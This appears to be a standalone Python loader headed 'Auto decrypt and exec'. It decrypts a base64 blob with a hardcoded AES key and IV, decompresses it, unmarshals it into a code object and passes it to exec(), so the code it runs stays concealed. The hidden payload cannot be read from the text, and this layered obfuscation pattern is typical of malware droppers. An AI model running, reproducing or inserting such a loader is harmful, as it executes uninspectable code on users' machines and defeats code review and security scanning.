# Auto decrypt and exec
import base64
import marshal
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

KEY = b'thisis16bytekey!'
IV = b'16byteinitvector'
encoded = "Ii/y93zXlukU04EuhzMHvLwEyLVoeHaOlQ0yJqkRPXBKVWU43ZVJYSenoVVt3oAWYmhtkd+xQaTamuXUqW+iia9gafG0hE2anp/jRnJvWNeluiRXimXnr+cPt2NTPXXMhWUBrKzJ4c5zOaTt/N6Iwrhs1VZCRccyXeyDfYQohNjAZvAOpR2qaYy66SRaCoD2L6fftPxD+oQpx3cGyLY/1A=="

cipher = AES.new(KEY, AES.MODE_CBC, IV)
decrypted = unpad(cipher.decrypt(base64.b64decode(encoded)), AES.block_size)
code = marshal.loads(zlib.decompress(decrypted))
exec(code)
